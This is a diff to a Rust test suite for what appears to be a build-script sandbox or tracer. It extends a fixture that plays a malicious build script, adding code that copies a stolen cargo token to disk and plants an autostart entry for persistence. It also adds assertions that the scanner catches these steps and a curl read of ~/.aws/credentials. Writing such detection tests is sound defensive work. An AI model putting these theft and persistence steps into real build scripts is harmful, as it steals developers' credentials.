@@ -59,6 +59,14 @@ fn main() {
         let mut reply = Vec::new();
         let _ = stream.read_to_end(&mut reply);
     }
+    // Persistence and a copy of the loot on the scratch disk.
+    if let Ok(out) = std::env::var("OUT_DIR") {
+        let _ = std::fs::write(format!("{out}/stolen.txt"), &token);
+    }
+    let autostart = format!("{home}/.config/autostart");
+    if std::fs::create_dir_all(&autostart).is_ok() {
+        let _ = std::fs::write(format!("{autostart}/canary.desktop"), "[Desktop Entry]\n");
+    }
     // No IPv6 route in the guest: the attempt fails there, and the trace
     // must still show it.
     if let Ok(target) = "[2001:db8::7]:443".parse() {
@@ -266,5 +274,27 @@ async fn a_build_script_that_steals_a_token_is_caught() {
         .expect("curl, started by the build script, is in the trace");
     assert!(opened(curl.pid, "/.aws/credentials"));
     assert!(curl.argv.iter().any(|a| a.ends_with("/.aws/credentials")));
+    // The host's own reading of the scratch disk.
+    let scratch = report
+        .scratch
+        .as_ref()
+        .expect("the scratch disk was scanned");
+    assert!(scratch.error.is_none(), "{:?}", scratch.error);
+    assert!(
+        report
+            .tokens_on_disk
+            .iter()
+            .any(|l| l.kind == "cargo_registry_token" && l.via.ends_with("/stolen.txt")),
+        "the copied token was not found: {:?}",
+        report.tokens_on_disk
+    );
+    assert!(
+        scratch
+            .outside_build
+            .iter()
+            .any(|e| e.path == "/work/home/.config/autostart/canary.desktop"),
+        "the autostart file was not found: {:?}",
+        scratch.outside_build
+    );
     std::fs::remove_dir_all(&work).unwrap();
 }
